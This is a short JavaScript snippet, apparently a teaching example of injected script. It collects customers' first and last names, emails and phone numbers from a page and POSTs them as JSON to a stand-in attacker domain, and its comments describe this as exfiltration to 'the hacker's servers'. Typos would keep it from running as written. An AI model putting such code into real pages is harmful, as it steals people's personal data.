  /*
   * Get a list of all customers from the page.
   */
   const customers = document.querySelctorAll('.openCases')

   /*
    * Iterate through each DOM element containg the openCases class,
    * collecting privileged personal identifier information (PII)
    * and store that data in the customerData array.
    */
    const customerData = [];
    customers.forEach((customer) => {
      customerData.push({
        firstName: customer.querySelector('.firstname').innerText,
        lastName: customer.querySelector('.lastname').innerText,
        email: customer.querySelector('.email').innerText,
        phone: customer.querySelector('.phone').innerText
      });
    });

    /*
     * Build a new HTTP request, and exfiltrate the previously collected
     * data to the hacker's servers.
     */

    const http = new XMLHttpRequest();
    http.open('POST', 'https:/steal-your-date.com/data', true);
    http.setRequestHeader('Content-type', 'application/json');
    http.send(JSON.stringify(customerData));